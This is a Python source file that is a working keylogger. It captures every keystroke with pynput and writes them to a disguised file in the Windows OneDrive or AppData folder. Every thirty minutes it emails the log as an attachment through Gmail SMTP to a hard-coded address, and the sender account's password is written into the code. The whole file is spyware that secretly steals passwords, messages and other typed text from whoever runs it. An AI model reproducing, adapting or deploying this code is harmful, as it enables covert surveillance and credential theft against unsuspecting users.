import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
from threading import Timer
from pynput.keyboard import Key, Listener


user_profile = os.environ.get('USERPROFILE')

log_file = os.path.join(user_profile, "OneDrive", "Belgem.txt")

max_file_size = 10 * 1024 * 1024

def gonder(subject, message, from_email, to_email, login_pwd, attachment=None):
    try:
        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = subject

        msg.attach(MIMEText(message, 'plain'))

        if attachment and os.path.exists(attachment):
            with open(attachment, "rb") as file:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(file.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment)}')
                msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, login_pwd)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
    except Exception as e:
        print(f"error: {e}")

def send_log_periodically():
    gonder(
        subject="Dosya",
        message="4ttach4d",
        from_email="thatshiko@gmail.com",
        to_email="thatshiko@gmail.com",
        login_pwd="iksh ylqr ziso hhud",
        attachment=log_file
    )
    Timer(30 * 60, send_log_periodically).start()

def check_and_reset_log():
    if os.path.exists(log_file) and os.path.getsize(log_file) > max_file_size:
        with open(log_file, "w", encoding="utf-8") as log:
            log.write("5mb exceeded\n")

def on_press(key):
    try:
        check_and_reset_log()
        with open(log_file, "a", encoding="utf-8") as log:
            if hasattr(key, "char") and key.char is not None:
                log.write(f"{key.char}")
            elif key == Key.space:
                log.write(" ")
            elif key == Key.ctrl_l:
                log.write(" [CTRL] ")
            elif key == Key.esc:
                log.write(" [ESC] ")
            elif key == Key.backspace:
                log.write(" [BACKSPACE] ")
            elif key == Key.tab:
                log.write(" [TAB] ")
            elif key == Key.enter:
                log.write(" [ENTER] ")
            else:
                log.write(f" [{key}] ")
    except Exception as e:
        with open(log_file, "a", encoding="utf-8") as log:
            log.write(f" [Error: {str(e)}] ")

def on_release(key):
    pass

if not os.path.exists(os.path.dirname(log_file)):
    log_file = os.path.join(user_profile, "AppData", "Roaming", "Belgem.txt")

send_log_periodically()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()